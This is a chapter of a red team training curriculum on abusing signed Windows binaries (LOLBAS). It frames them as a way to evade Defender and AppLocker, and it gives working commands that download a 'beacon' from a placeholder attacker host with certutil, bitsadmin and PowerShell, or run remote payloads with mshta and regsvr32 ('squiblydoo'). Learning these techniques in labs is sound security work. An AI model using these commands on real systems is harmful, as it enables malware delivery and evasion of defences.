# Phase 15: LOLBAS & Red Team Tradecraft

> **Why**: When Defender catches your beacon and you have no tools available, signed Microsoft binaries are your safety net. This phase turns default Windows installations into your attacker toolkit.

**Study time**: 3 days | **Difficulty**: Intermediate

---

## Key LOLBAS Techniques

### Why LOLBAS bypasses AV
Signed binaries by Microsoft are inherently trusted by Windows Defender. They're on the whitelist. The *content* of what they execute may still be scanned (by AMSI for scripts) but the binary itself is never flagged.

### File download without curl/wget
```cmd
# certutil — downloads and optionally decodes
certutil.exe -urlcache -split -f http://<ip>/beacon.exe beacon.exe
# WHY: certutil was designed to handle certificates — including downloading CRLs from URLs.
# It has full HTTP client capability.

# bitsadmin — Windows background transfer service
bitsadmin /transfer job /download /priority high http://<ip>/beacon.exe beacon.exe
# WHY: BITS is designed for downloading Windows Updates. Full HTTP client.

# PowerShell (always available)
iwr http://<ip>/beacon.exe -OutFile beacon.exe
```

### Execution without running your binary directly
```cmd
# mshta — executes HTA (HTML Applications)
mshta.exe http://<ip>/beacon.hta
# WHY: HTAs are legitimate Microsoft technology. mshta.exe is signed and trusted.

# regsvr32 — DLL registration tool
regsvr32.exe /s /n /u /i:http://<ip>/payload.sct scrobj.dll
# WHY: scrobj.dll handles COM script components. regsvr32 passes the URL to scrobj.dll.
# This executes the remote script with NO file written to disk.
# Called "squiblydoo" — bypasses AppLocker by default.

# rundll32 — runs DLL exports
rundll32.exe C:\path\to\evil.dll,Export
# WHY: Designed to test DLL exports. Runs any DLL function directly.
```

---

## Practice Labs

| Lab | Platform | Focus |
|-----|---------|-------|
| [LOLBAS Project](https://lolbas-project.github.io) | Free | Full reference catalog |
| [THM: Living Off the Land](https://tryhackme.com/room/livingofftheland) | THM (Sub) | Hands-on LOLBAS |

---

## Phase 15 Mastery Checklist

- [ ] Can you download a file to a Windows host using 3 different LOLBins?
- [ ] Can you execute a payload using only signed Microsoft binaries?
- [ ] Can you explain why regsvr32 /scrobj.dll bypasses AppLocker?

---

## Next Phase → **Phase 16: PowerShell & .NET Tradecraft**
